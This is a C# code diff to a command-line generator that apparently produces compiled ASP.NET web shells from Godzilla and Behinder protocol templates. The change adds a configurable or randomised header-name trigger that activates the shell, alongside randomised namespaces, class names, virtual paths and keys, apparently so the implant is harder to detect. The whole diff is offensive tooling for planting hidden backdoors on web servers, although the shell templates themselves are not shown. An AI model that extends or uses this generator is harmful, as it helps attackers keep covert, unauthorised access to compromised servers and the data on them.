@@ -8,6 +8,7 @@ public class GenerateOptions
     public string? Key { get; set; }
     public string? VirtualPath { get; set; }
     public string? Header { get; set; }
+    public string? HeaderName { get; set; }
     public string TargetFramework { get; set; } = "net40";
     public string OutputFormat { get; set; } = "aspx";
     public int? Seed { get; set; }
@@ -29,6 +30,7 @@ public static class GenerateCommand
                 case "--key": opts.Key = NextArg(args, ref i, "--key"); break;
                 case "--path": opts.VirtualPath = NextArg(args, ref i, "--path"); break;
                 case "--header": opts.Header = NextArg(args, ref i, "--header"); break;
+                case "--headername": opts.HeaderName = NextArg(args, ref i, "--headername"); break;
                 case "--target": opts.TargetFramework = NextArg(args, ref i, "--target"); break;
                 case "--format": opts.OutputFormat = NextArg(args, ref i, "--format"); break;
                 case "--seed": opts.Seed = int.Parse(NextArg(args, ref i, "--seed")); break;
@@ -52,13 +54,15 @@ public static class GenerateCommand
         string ns = rng.NextNamespace();
         string cls = rng.NextClassName();
         string virtualPath = opts.VirtualPath ?? rng.NextVirtualPath();
+        string triggerName = opts.HeaderName ?? rng.NextHexString(8);
 
         Console.WriteLine($"[+] namespace: {ns}");
         Console.WriteLine($"[+] class:     {cls}");
         Console.WriteLine($"[+] path:      {virtualPath}");
         Console.WriteLine($"[+] key:       {key}");
+        Console.WriteLine($"[+] trigger:  {triggerName}");
 
-        string source = RenderTemplate(opts, ns, cls, key, virtualPath);
+        string source = RenderTemplate(opts, ns, cls, key, virtualPath, triggerName);
         Console.WriteLine("[+] template rendered");
 
         var compiler = new Compiler.RoslynCompiler();
@@ -132,16 +136,17 @@ public static class GenerateCommand
         return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant()[..16];
     }
 
-    static string RenderTemplate(GenerateOptions opts, string ns, string cls, string key, string virtualPath)
+    static string RenderTemplate(GenerateOptions opts, string ns, string cls, string key, string virtualPath, string triggerName)
     {
         string quotedPass = "\"" + opts.Password.Replace("\"", "\\\"") + "\"";
+        string quotedTrigger = "\"" + triggerName.Replace("\"", "\\\"") + "\"";
         string quotedKey = "\"" + key.Replace("\"", "\\\"") + "\"";
         string members, trigger, randomStr;
 
         if (opts.ShellProtocol == "godzilla")
         {
             members = Shells.GodzillaCSharp.MembersBlock.Replace("{{PASSWORD}}", quotedPass).Replace("{{KEY}}", quotedKey);
-            trigger = Shells.GodzillaCSharp.TriggerBlock.Replace("{{PASSWORD}}", quotedPass).Replace("{{KEY}}", quotedKey);
+            trigger = Shells.GodzillaCSharp.TriggerBlock.Replace("{{PASSWORD}}", quotedTrigger).Replace("{{KEY}}", quotedKey);
             randomStr = Shells.GodzillaCSharp.RandomStringBlock;
         }
         else if (opts.ShellProtocol == "behinder")
